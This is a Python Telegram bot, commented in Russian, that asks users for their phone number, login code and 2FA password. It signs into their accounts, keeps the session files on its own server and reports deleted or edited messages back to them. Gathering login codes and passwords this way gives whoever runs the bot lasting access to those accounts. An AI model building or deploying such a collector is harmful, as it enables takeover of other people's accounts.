import os
import asyncio
import logging
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    FloodWaitError
)
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# ========== БАЗА ДАННЫХ ==========
users_db = {}  # {user_id: {'phones': [], 'active_client': None, 'settings': {}}}
user_sessions = {}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}
user_clients = {}
timers = {}
flood_until = {}
user_contacts = {}

# ========== ТАЙМЕРЫ ==========
async def show_unlock_timer(event, user_id, seconds):
    msg = await event.reply("⏳ **Загружаю таймер...**")
    unlock_time = datetime.now() + timedelta(seconds=seconds)
    flood_until[user_id] = unlock_time
    
    while datetime.now() < unlock_time:
        remaining = int((unlock_time - datetime.now()).total_seconds())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        secs = remaining % 60
        progress = int(((seconds - remaining) / seconds) * 20)
        bar = '█' * progress + '░' * (20 - progress)
        
        await msg.edit(
            f"🔒 **НОМЕР ЗАБЛОКИРОВАН**\n\n"
            f"⏱ **{hours:02d}:{minutes:02d}:{secs:02d}**\n"
            f"└ {bar}"
        )
        await asyncio.sleep(1)
    
    await msg.edit("✅ **НОМЕР РАЗБЛОКИРОВАН!**")
    if user_id in flood_until:
        del flood_until[user_id]

async def start_code_timer(user_id, chat_id, seconds=120):
    msg = await bot.send_message(chat_id, f"⏳ **{seconds//60}:{seconds%60:02d}**")
    timers[user_id] = {'message': msg, 'running': True}
    
    for i in range(seconds):
        if not timers.get(user_id, {}).get('running'):
            break
        remaining = seconds - i
        mins, secs = remaining // 60, remaining % 60
        progress = int((i / seconds) * 20)
        bar = '█' * progress + '░' * (20 - progress)
        await msg.edit(f"⏳ **{mins}:{secs:02d}**\n└ {bar}")
        await asyncio.sleep(1)
    
    if timers.get(user_id, {}).get('running'):
        await msg.edit("⌛ **Время вышло!**")
    if user_id in timers:
        del timers[user_id]

def stop_timer(user_id):
    if user_id in timers:
        timers[user_id]['running'] = False
        del timers[user_id]

# ========== СОХРАНЕНИЕ НОМЕРОВ ==========
async def save_user_phone(user_id, phone):
    if user_id not in users_db:
        users_db[user_id] = {'phones': [], 'active_client': None}
    if phone not in users_db[user_id]['phones']:
        users_db[user_id]['phones'].append(phone)
        users_db[user_id]['phones'] = users_db[user_id]['phones'][-5:]

# ========== ОСНОВНОЙ ОБРАБОТЧИК ==========
@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПРОВЕРКА БЛОКИРОВКИ ===
    if user_id in flood_until and datetime.now() < flood_until[user_id]:
        remaining = int((flood_until[user_id] - datetime.now()).total_seconds())
        await show_unlock_timer(event, user_id, remaining)
        return

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply(
                f"✅ **Пин-код верный!**\n\n"
                f"👇 **Выбери действие:**",
                buttons=[
                    [Button.text("📱 Отправить контакт", resize=True)],
                    [Button.text("📞 Ввести номер")],
                    [Button.text("📋 Мои номера")]
                ]
            )
        else:
            await event.reply(f"🔐 **Неверный пин-код!**\nВведи: `5482`")
        return

    # === ГЛАВНОЕ МЕНЮ ===
    if text == "/start":
        await event.reply(
            f"📱 **Главное меню**",
            buttons=[
                [Button.text("📱 Отправить контакт")],
                [Button.text("📞 Ввести номер")],
                [Button.text("📋 Мои номера")]
            ]
        )
        return

    # === ОТПРАВИТЬ КОНТАКТ ===
    if text == "📱 Отправить контакт":
        await event.reply(
            f"📱 **Нажми кнопку:**",
            buttons=[[Button.request_contact("📞 Поделиться контактом")]]
        )
        return

    # === ВВЕСТИ НОМЕР ===
    if text == "📞 Ввести номер":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply("📞 **Введи номер:**\n`+79001234567`")
        return

    # === МОИ НОМЕРА ===
    if text == "📋 Мои номера":
        phones = users_db.get(user_id, {}).get('phones', [])
        if not phones:
            await event.reply("📭 **Нет сохранённых номеров**")
            return
        
        buttons = []
        for i, phone in enumerate(phones):
            buttons.append([Button.text(f"📞 {i+1}️⃣ {phone}")])
        buttons.append([Button.text("🔙 Назад")])
        
        await event.reply(
            f"📱 **Твои номера:**\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(phones)]),
            buttons=buttons
        )
        return

    # === ВЫБОР СОХРАНЁННОГО НОМЕРА ===
    if text.startswith("📞") and "️⃣" in text:
        parts = text.split()
        if len(parts) >= 3:
            idx = int(parts[1][0]) - 1
            phones = users_db.get(user_id, {}).get('phones', [])
            if idx < len(phones):
                await process_phone(event, user_id, phones[idx])
        return

    # === ОБРАБОТКА НОМЕРА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        await process_phone(event, user_id, text)
        return

    # === ОБРАБОТКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        await process_code(event, user_id, text)
        return

    # === ОБРАБОТКА 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        await process_2fa(event, user_id, text)
        return

# ========== ОБРАБОТКА НОМЕРА ==========
async def process_phone(event, user_id, phone):
    user_sessions[user_id] = {'phone': phone, 'step': 'waiting_code'}
    await save_user_phone(user_id, phone)
    
    msg = await event.reply("🔄 **Подключаюсь к Telegram...**")
    
    try:
        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
        await client.connect()
        sent = await client.send_code_request(phone)
        
        user_sessions[user_id]['client'] = client
        user_sessions[user_id]['code_hash'] = sent.phone_code_hash
        
        await msg.edit("✅ **Код отправлен!**")
        await start_code_timer(user_id, event.chat_id, 120)
        
    except FloodWaitError as e:
        await show_unlock_timer(event, user_id, e.seconds)
        del user_sessions[user_id]
    except Exception as e:
        await msg.edit(f"❌ **Ошибка:** {e}")
        del user_sessions[user_id]

# ========== ОБРАБОТКА КОДА ==========
async def process_code(event, user_id, code):
    session = user_sessions[user_id]
    client = session['client']
    stop_timer(user_id)
    
    msg = await event.reply("🔑 **Проверяю код...**")
    
    try:
        await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
        me = await client.get_me()
        user_clients[user_id] = client
        
        await msg.edit(
            f"✅ **Вход выполнен!**\n\n"
            f"👤 @{me.username}\n"
            f"🔍 **Мониторинг запущен!**"
        )
        del user_sessions[user_id]
        asyncio.create_task(monitor_user_chats(user_id, client))
        
    except SessionPasswordNeededError:
        user_sessions[user_id]['step'] = 'waiting_2fa'
        await msg.edit("🔐 **Введи пароль 2FA:**")
    except PhoneCodeInvalidError:
        await msg.edit("❌ **Неверный код!**")
        user_sessions[user_id]['step'] = 'waiting_code'
        await start_code_timer(user_id, event.chat_id, 120)
    except PhoneCodeExpiredError:
        await msg.edit("⌛ **Код истёк!**")
        del user_sessions[user_id]
    except Exception as e:
        await msg.edit(f"❌ **Ошибка:** {e}")
        del user_sessions[user_id]

# ========== ОБРАБОТКА 2FA ==========
async def process_2fa(event, user_id, password):
    session = user_sessions[user_id]
    client = session['client']
    
    msg = await event.reply("🔐 **Проверяю пароль...**")
    
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        user_clients[user_id] = client
        
        await msg.edit(
            f"✅ **Вход с 2FA выполнен!**\n\n"
            f"👤 @{me.username}\n"
            f"🔍 **Мониторинг запущен!**"
        )
        del user_sessions[user_id]
        asyncio.create_task(monitor_user_chats(user_id, client))
    except Exception as e:
        await msg.edit(f"❌ **Ошибка:** {e}")

# ========== ОБРАБОТКА КОНТАКТА ==========
@bot.on(events.NewMessage(func=lambda e: e.message.contact))
async def contact_handler(event):
    user_id = event.sender_id
    contact = event.message.contact
    
    if str(user_id) != str(contact.user_id):
        await event.reply("❌ **Это не твой номер!**")
        return
    
    phone = contact.phone_number
    await save_user_phone(user_id, phone)
    
    await event.reply(
        f"✅ **Контакт получен!**\n\n"
        f"📱 {phone}\n"
        f"👤 {contact.first_name}\n\n"
        f"Войти сейчас?",
        buttons=[
            [Button.text("✅ Да, войти")],
            [Button.text("📋 Мои номера")],
            [Button.text("❌ Нет")]
        ]
    )

@bot.on(events.NewMessage)
async def confirm_handler(event):
    user_id = event.sender_id
    text = event.message.text
    
    if text == "✅ Да, войти" and user_id in users_db:
        phones = users_db[user_id].get('phones', [])
        if phones:
            await process_phone(event, user_id, phones[-1])
    elif text == "📋 Мои номера":
        phones = users_db.get(user_id, {}).get('phones', [])
        if phones:
            await event.reply(
                f"📱 **Твои номера:**\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(phones)]),
                buttons=[[Button.text("🔙 Назад")]]
            )
    elif text == "❌ Нет":
        await event.reply("❌ **Отменено**")

# ========== МОНИТОРИНГ ==========
async def monitor_user_chats(user_id, client):
    await bot.send_message(user_id, "🔍 **Мониторинг запущен!**")
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        await bot.send_message(user_id, f"🗑 **Удалено** {len(event.deleted_ids)} сообщений")
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        if event.message.text:
            await bot.send_message(user_id, f"✏️ **Изменено:** {event.message.text[:100]}")
    
    @client.on(events.NewMessage)
    async def on_new(event):
        if hasattr(event.message, 'ttl_seconds') and event.message.ttl_seconds:
            await bot.send_message(user_id, f"⏳ **Истекающее сообщение**")
    
    await client.run_until_disconnected()

# ========== ЗАПУСК ==========
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())